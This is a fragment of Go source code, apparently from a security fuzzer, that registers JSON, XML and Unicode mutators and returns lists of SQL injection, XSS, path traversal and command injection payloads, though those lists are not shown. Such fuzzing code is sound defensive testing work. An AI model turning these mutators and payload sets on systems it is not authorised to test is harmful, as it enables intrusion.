	engine.Register(NewJSONMutator(JSONStructure))
	engine.Register(NewJSONMutator(JSONInjection))

	// XML mutators
	engine.Register(NewXMLMutator(XMLEntityInjection))
	engine.Register(NewXMLMutator(XMLTagMangling))
	engine.Register(NewXMLMutator(XMLAttributeMutation))
	engine.Register(NewXMLMutator(XMLCDATAInjection))

	// Other smart mutators
	engine.Register(NewBoundaryMutator())
	engine.Register(NewUnicodeAttackMutator())
}

// GetSQLiPayloads returns SQL injection payloads
func GetSQLiPayloads() []string {
	return sqlInjectionPayloads
}

// GetXSSPayloads returns XSS payloads
func GetXSSPayloads() []string {
	return xssPayloads
}

// GetPathTraversalPayloads returns path traversal payloads
func GetPathTraversalPayloads() []string {
	return pathTraversalPayloads
}

// GetCommandInjectionPayloads returns command injection payloads
func GetCommandInjectionPayloads() []string {
	return commandInjectionPayloads
}
